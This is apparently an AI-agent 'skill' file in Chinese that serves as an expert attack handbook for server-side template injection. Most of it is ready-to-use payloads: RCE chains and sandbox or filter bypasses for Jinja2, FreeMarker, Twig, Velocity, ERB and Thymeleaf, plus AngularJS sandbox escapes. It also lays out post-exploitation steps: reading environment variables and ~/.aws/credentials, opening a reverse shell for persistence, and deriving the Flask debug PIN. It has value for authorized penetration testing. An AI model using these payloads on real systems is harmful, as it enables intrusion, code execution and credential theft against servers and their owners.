# 技能：服务器端模板注入（SSTI）—— 专家攻击手册

> **AI 加载指令**：专家级 SSTI 技术。涵盖多语言探测、引擎指纹识别、Jinja2/FreeMarker/Twig/ERB 远程代码执行链、客户端 Angular SSTI 以及绕过技术。基础模型常会遗漏沙箱逃逸 MRO 链和非 Jinja2 引擎。对于 PHP CMS 模板评估、Jira SSTI、Confluence OGNL 和 Spring Cloud Gateway SpEL，请加载配套的 [SCENARIOS.md](./SCENARIOS.md)。

## 0. 相关路由

在使用特定引擎的完整利用之前，您可以首先加载：

- 首先使用本文件顶部的多语言探测序列进行低噪音指纹识别
- [表达式语言注入](../expression-language-injection/SKILL.md) 当 `${7*7}` 或 `%{7*7}` 在 Java (SpEL/OGNL) 中解析时 — 与模板引擎不同的攻击面

### 扩展场景

当您需要时，也加载 [SCENARIOS.md](./SCENARIOS.md)：

- Maccms 8.x PHP 模板 `eval` — `vod-search` 中的 `{if-A:phpinfo()}{endif-A}` — 用于 webshell 写入的 base64 绕过
- Jira CVE-2019-11581 — "联系管理员" 表单 → Velocity 模板注入 → 命令输出在管理员邮箱中
- Spring Cloud Gateway SpEL (CVE-2022-22947) — 使用 `StreamUtils.copyToByteArray` 的 actuator 路由注入以捕获输出
- Struts2 OGNL S2-045 (CVE-2017-5638) — 使用 `_memberAccess` / `OgnlUtil` 黑名单清除的 Content-Type 头 OGNL 注入
- Confluence OGNL CVE-2021-26084 — `\u0027` Unicode 绕过的 `createpage-entervariables.action`
- SSTI 与 EL 注入的区分指南
- 额外的模板引擎：ASP.NET Razor、Elixir EEx、PHP Smarty/Latte/Blade、JS Pug/Handlebars/Nunjucks/EJS/Lodash + 通用探测 + 盲目 SSTI + Flask PIN 计算

**SCENARIOS.md 参考 (§7–§11)**：有关扩展有效载荷和 Razor、EEx/LEEx/HEEx、PHP 堆栈、JavaScript 模板引擎、通用多语言探测、数学指纹识别、盲目 SSTI（布尔值/时间/OOB）以及 Flask 调试 PIN 前提条件的引擎特定说明，请参阅 [SCENARIOS.md](./SCENARIOS.md)。此技能在 §13–§15 中保留一个简短清单。

### 引擎有效载荷参考

对于扩展的引擎特定指纹识别、有效载荷矩阵（Jinja2、Twig、FreeMarker、Velocity、Pebble、Mako、Slim、Handlebars、Thymeleaf、Smarty、ERB、Jade/Pug）以及盲目 SSTI 检测技术（基于时间、基于 DNS），请参阅 [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md)。

### 通用检测与盲目 SSTI (指针)

首先使用 §1 和 §13 中的多语言有效载荷和数学探测；当您需要更完整的盲测模式和每个引擎的示例（包括非 Python 堆栈）时，请遵循 [SCENARIOS.md](./SCENARIOS.md) §11 并在此处交叉检查 §14 的技术名称（布尔值、时间、OOB、基于错误）。

---

## 1. 检测 — 多语言探测序列

首次测试：区分 SSTI 与 XSS。发送这些探测并检查服务器端是否**计算数学表达式**：

```
{{7*7}}        → IF 返回 49（不是 {{7*7}}）→ Jinja2 或 Twig
${7*7}         → IF 返回 49 → FreeMarker、Velocity 或 Java EL
#{7*7}         → Ruby (ERB 字符串插值)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
```

**Jinja2 与 Twig 区分**：
```
{{7*'7'}}
→ 7777777  = Jinja2 (Python 字符串乘法)
→ 49       = Twig (PHP 数值)
```

**安全检测探测**（无数学，仅布尔值）：
```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

---

## 2. 引擎到语言映射

| 模板引擎 | 语言 | 框架 |
|---|---|---|
| Jinja2 | Python | Flask、FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony、Laravel |
| Smarty | PHP | 各种 |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | 各种 Java |
| Pebble | Java | 各种 Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

从错误中识别语言 → 然后缩小到模板引擎。

---

## 3. Jinja2 (Python Flask) — 远程代码执行链

### 链 1: 通过 `__globals__` 访问 `os` 模块
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 链 2: MRO 子类遍历（沙箱逃逸）
```python
# 列出所有子类：
{{''.__class__.__mro__[1].__subclasses__()}}

# 查找 subprocess.Popen 的索引（通常在 258-270 之间，因 Python 版本而异）：
# 在列表中查找 "subprocess.Popen"

# 执行命令（将 [258] 替换为正确的索引）：
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
```

### 链 3: `request` 对象全局（当 `config` 被阻止时）
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
（使用十六进制编码以避免 `_` 过滤）

### 链 4: `lipsum` 函数全局（Flask 内置）
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

### 链 5: `cycler` 对象
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### 动态查找正确的 subprocess 索引：
```python
# 在注入中：
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{loop.index}}
  {% endif %}
{% endfor %}
```

---

## 4. Jinja2 沙盒绕过技术

### 当 `_`（下划线）被阻止时：
```python
# 使用带有十六进制编码的 attr 过滤器：
''|attr('\x5f\x5fclass\x5f\x5f')

# 通过 request 对象使用 getattr：
request|attr('args')|attr('__class__')
```

### 当 `.`（点）被阻止时：
```python
# 使用 [] 下标表示法：
''['__class__']
config['SECRET_KEY']
```

### 当关键字（class、mro）被阻止时：
在 `attr()` 中使用十六进制/Unicode：
```python
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
```

### 当输出编码剥离 HTML 实体时：
使用 `|safe` 过滤器以防止自动转义。

---

## 5. FreeMarker (Java) — 远程代码执行

### 通过 freemarker.template.utility.Execute 执行命令
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### 通过 ObjectConstructor 的替代方法：
```freemarker  
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

---

## 6. Twig (PHP) — 远程代码执行

```php
// Twig 1.x（沙盒之前）：
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x 使用内置功能：
{{['id']|map('system')|join}}

// 通过 filter map：
{{app.request.server.all|join(',')}}
```

---

## 7. Velocity (Java) — 远程代码执行

```velocity
#set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
#set($run=$str.exec("id"))
#set($out=$run.inputStream)
```

或更直接：
```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (Ruby Rails) — 远程代码执行

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

## 9. Thymeleaf (Java Spring) — 远程代码执行

Thymeleaf 与 Spring EL (SpEL)：
```java
// 在 th:text 或 th:fragment 上下文中：
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

// Fragment 表达式上下文中：
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. 客户端模板注入 (AngularJS)

当 AngularJS 在客户端使用且用户数据流入模板表达式时：

```javascript
// AngularJS 1.x 沙盒逃逸：
{{constructor.constructor('alert(1)')()}}

// 1.5.x：
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x：
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**检测**：发送 `{{1+1}}` — 如果页面显示 `2`，则 AngularJS 在 DOM 中评估表达式。

---

## 11. SSTI → 完整远程代码执行路径

```
检测到 SSTI → 识别引擎
├── Jinja2 → config.__globals__['os'].popen() 
│           OR 子类遍历以获取 Popen
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── Angular CSTI → constructor.constructor('payload')()
```

**远程代码执行后切换**：
1. 读取 `/proc/self/environ` — 包含凭证的环境变量
2. 读取应用程序配置文件 — 数据库密码、API 密钥
3. `cat ~/.aws/credentials` — 云凭证
4. 反向 shell 以实现持久化

---

## 12. 常见的注入入口点

用户数据流入模板的位置：
- URL 路径：`https://site.com/home?name={{7*7}}`
- 查询参数：`?message=Hello`
- HTML 表单：用户名、简介、内容字段
- 错误页面：`404 Not Found: /PAYLOAD`
- 邮件模板：密码重置邮件中的用户名
- 内联模板渲染：`render_template_string(user_input)`

**最危险**：Flask 中的 `render_template_string()` — 整个用户输入用作模板。

---

## 13. 通用检测有效载荷

**触发多个引擎错误或评估的多语言探测**：

```
${{<%[%'"}}%\.
```

**数学探测**用于盲测/错误确认：

```
{{7*7}}          → 49 (Jinja2、Twig、Nunjucks、Handlebars)
${7*7}           → 49 (FreeMarker、Velocity、EL、Thymeleaf)
<%= 7*7 %>       → 49 (ERB、EJS、EEx)
#{7*7}           → 49 (Pug、Ruby 插值)
@(7*7)           → 49 (Razor)
{7*7}            → 49 (Smarty)
```

**基于错误的引擎指纹**（解析器/堆栈跟踪通常命名引擎）：

```
(1/0).zxy.zxy
```

---

## 14. 盲目 SSTI 技术

- **基于布尔值**：比较 `(3*4/2)` vs `3*)2(/4` — 如果第一个解析而第二个报错，则很可能评估
- **基于时间**：`{{sleep(5)}}` 或引擎特定的延迟等效项
- **OOB**：通过模板表达式进行 DNS/HTTP 回调，当直接输出不可见时
- **基于错误**：根据真/假条件强制不同的错误消息

---

## 15. Flask PIN 计算

当 Flask **调试模式**（Werkzeug 调试器）暴露但**受 PIN 保护**时，PIN 由特定于主机的值导出。公共 PIN 计算脚本典型的输入：

1. **`username`** — 来自 `/etc/passwd`（运行 Flask 进程的用户）
2. **模块名** — 通常 `flask.app` 或 `Flask`
3. **应用程序路径** — `app.py` 或实际主文件名
4. **MAC 地址** — 例如 `/sys/class/net/eth0/address`，转换为十进制，因为 Werkzeug 需要这样
5. **机器 ID** — `/etc/machine-id`，或 `/proc/sys/kernel/random/boot_id` 与 `/proc/self/cgroup` 的第一行组合，根据 Werkzeug 的算法
6. **计算 PIN** — 使用实现相同算法的已建立开源 PIN 计算器，这些算法基于这些值

> 仅在您有权测试的系统上使用；获取这些值意味着先前的访问或额外的信息泄露向量。
